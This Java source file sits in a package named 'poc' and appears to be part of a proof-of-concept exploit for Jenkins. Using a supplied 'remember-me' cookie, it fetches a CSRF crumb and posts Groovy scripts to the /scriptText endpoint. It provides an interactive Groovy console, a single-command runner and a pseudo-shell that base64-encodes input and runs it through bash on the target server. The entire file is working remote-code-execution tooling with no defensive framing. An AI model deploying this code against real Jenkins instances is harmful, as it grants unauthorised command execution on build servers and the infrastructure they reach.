package poc;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;
import java.util.Map;
import java.util.Scanner;
import org.json.JSONObject;
import java.util.Base64;


public final class ScriptConsole {
    public String jenkins_server;
    public String cookie;


    public ScriptConsole(String jenkins_server, String cookie) {
        this.jenkins_server = jenkins_server;
        this.cookie = cookie;
    }


    public boolean repl() {
        if (!accessOK()) return false;
        Scanner scanner = new Scanner(System.in);
        System.out.println("Welcome to the Jenkins Script Console REPL!");
        System.out.println("Type 'exit' to quit.");
        while (true) {
            System.out.print("Jenkins> ");
            String script = scanner.nextLine();
            if ("exit".equalsIgnoreCase(script)) break;
            String response = sendScript(script);
            if (response != null) System.out.print(response);
        }
        scanner.close();
        return true;
    }

    public boolean runCommand(String cmd) {
        if (!accessOK()) return false;

        String encodedCmd = Base64.getEncoder().encodeToString(cmd.getBytes());
        String script = "['bash', '-c',  new String(\""+  encodedCmd + "\".decodeBase64())].execute().text";

        String response = sendScript(script);
        if (response != null) System.out.print(response.substring(8));
        return true;
    }

    public boolean shell() {
        if (!accessOK()) return false;
        Scanner scanner = new Scanner(System.in);
        while (true) {
            System.out.print("shell> ");
            String script = scanner.nextLine();
            if ("exit".equalsIgnoreCase(script)) break;
            String encodedCmd = Base64.getEncoder().encodeToString(script.getBytes());
            // script = "println new String(\"" + encodedCmd + "\".decodeBase64()).execute().text";
            script = "['bash', '-c',  new String(\""+  encodedCmd + "\".decodeBase64())].execute().text";
            //System.out.println(script);

            String response = sendScript(script);
            if (response != null) System.out.print(response.substring(8));

        }
        scanner.close();
        return true;
    }

    public String sendScript(String script) {
        try {
            Map<String, String> jenkinsCrumbData = fetchJenkinsCrumb();  // Fetch the crumb and JSESSIONID
            String response = sendScriptToJenkins(script, jenkinsCrumbData);
            return response;
        } catch (Exception e) {
            System.err.println("[!] Error sending script to Jenkins: " + e.getMessage());
            //e.printStackTrace();
        }
        return null;
    }


    public boolean accessOK() {
        String response = sendScript("println '123test123'");
        if (response == null) return false;
        return response.contains("123test123");
    }


    private Map<String, String> fetchJenkinsCrumb() throws Exception {
        // Set up the CrumbIssuer URL
        URL url = new URL(this.jenkins_server + "/crumbIssuer/api/json");

        // Open the HTTP connection
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        connection.setRequestProperty("Cookie", "remember-me=" + this.cookie);

        // Read the server response
        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        String inputLine;
        StringBuilder content = new StringBuilder();
        while ((inputLine = in.readLine()) != null) {
            content.append(inputLine);
        }

        // Close the connections
        in.close();

        // Extract the cookies from the response headers
        String jSessionId = null;
        Map<String, List<String>> headerFields = connection.getHeaderFields();
        List<String> cookiesHeader = headerFields.get("Set-Cookie");
        if (cookiesHeader != null) {
            for (String cookie : cookiesHeader) {
                if (cookie.startsWith("JSESSIONID")) {
                    jSessionId = cookie.split(";")[0];  // Get the JSESSIONID name and value
                    break;
                }
            }
        }

        // Disconnect the connection
        connection.disconnect();

        // Extract the crumb and crumbRequestField from the JSON
        JSONObject jsonObject = new JSONObject(content.toString());
        String crumb = jsonObject.getString("crumb");
        String crumbRequestField = jsonObject.getString("crumbRequestField");

        // Return both crumb and JSESSIONID in a map
        return Map.of(
                "crumb", crumb,
                "crumbRequestField", crumbRequestField,
                "JSESSIONID", jSessionId
        );
    }

    private String sendScriptToJenkins(String script, Map<String, String> jenkinsCrumbData) throws Exception {
        // Set up the Jenkins script console URL
        URL url = new URL(this.jenkins_server + "/scriptText");

        // Open the HTTP connection
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setDoOutput(true);

        // Set headers with Remember Me cookie, Crumb Token, and JSESSIONID
        connection.setRequestProperty("Cookie", "remember-me=" + this.cookie + "; " + jenkinsCrumbData.get("JSESSIONID"));
        connection.setRequestProperty(jenkinsCrumbData.get("crumbRequestField"), jenkinsCrumbData.get("crumb"));
        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

        // Send the script as data in the request body
        String postData = "script=" + java.net.URLEncoder.encode(script, "UTF-8");
        try (OutputStream os = connection.getOutputStream()) {
            os.write(postData.getBytes());
            os.flush();
        }

        // Read the server response
        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        String inputLine;
        StringBuilder content = new StringBuilder();
        while ((inputLine = in.readLine()) != null) {
            content.append(inputLine).append("\n");
        }

        // Close the connections
        in.close();
        connection.disconnect();

        return content.toString();
    }

}
